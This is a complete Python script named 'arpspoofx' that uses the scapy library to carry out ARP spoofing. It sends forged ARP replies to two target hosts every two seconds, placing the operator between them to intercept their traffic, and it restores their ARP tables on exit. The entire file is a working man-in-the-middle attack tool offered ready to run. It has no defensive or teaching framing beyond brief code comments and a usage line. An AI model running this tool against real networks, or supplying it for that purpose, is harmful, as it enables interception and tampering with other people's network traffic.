#!/bin/python3
# arpspoofx
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    # function that returns the mac address of the desired IP address
    # creating an ARP-request out of the desired IP
    arpRequest = scapy.ARP(pdst = ip)
    # setting broadcast mac address
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    # join these into a single packet
    arpRequestBroadcast = broadcast / arpRequest
    # srp returns two lists of IP addresses that responded and not responded to the package
    answeredList = scapy.srp(arpRequestBroadcast, timeout = 5, verbose = False)[0]
    # the mac address which responded is stored in the hwsrc field of scapy
    return answeredList[0][1].hwsrc

def spoof(targetIP, spoofIP):
    # ARP-spoofing 
    # packet which modifies the arp table of two devices --> usually the target and the gateway
    # 
    packet = scapy.ARP(op = 2, pdst = targetIP, hwdst = get_mac(targetIP), psrc = spoofIP)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, 
                             hwdst = destination_mac, 
                psrc = source_ip, hwsrc = source_mac)
  
    scapy.send(packet, verbose = False)

def interface():
    print('usage: ./arpspoofx [TARGET1] [TARGET2]')

def main():
    if len(sys.argv) == 3:
        print('arpspoofx 1.0.1\r\n')
        targetIP1 = sys.argv[1]
        targetIP2 = sys.argv[2]
        packetCount = 0
        try:
            while True:
                spoof(targetIP1, targetIP2)
                spoof(targetIP2, targetIP1)
                packetCount += 1
                print(f'sent spoofed packets [{packetCount}] to {targetIP2} | sent spoofed packets [{packetCount}] to {targetIP1}')
                time.sleep(2)
        except KeyboardInterrupt:
            print('^C. cleaning arp-tables up')
            restore(targetIP2, targetIP1)
            print(f'restoring original arp-table from {targetIP2}')
            restore(targetIP1, targetIP2)
            print(f'restoring original arp-table from {targetIP1}')
            sys.exit()
    else:
        interface()
    
try:
    main()
except Exception as error:
    print('ERROR: ', error)
    sys.exit


